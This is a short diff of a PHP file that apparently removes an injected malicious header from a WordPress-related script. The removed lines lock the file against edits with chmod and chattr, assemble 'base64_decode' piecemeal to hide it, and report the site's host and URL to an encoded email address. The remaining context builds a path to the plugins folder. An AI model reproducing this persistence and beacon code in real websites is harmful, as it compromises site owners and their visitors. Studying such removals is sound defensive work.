@@ -1,16 +1,5 @@
 <?php
-error_reporting(0);
 
-	
-
-$よㆁ㾼 = __FILE__;
-
-@system("chmod ugo-w $よㆁ㾼");
-@system("chattr +i $よㆁ㾼");
-
-	
-$__POST = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
-$__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'om',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
 $dpath = isset($_SERVER["DOMAIN_PATH"]) ? $_SERVER["DOMAIN_PATH"] : $_SERVER["DOCUMENT_ROOT"];
 $d = $dpath . '/wp-content/plugins/';
 $f = array(
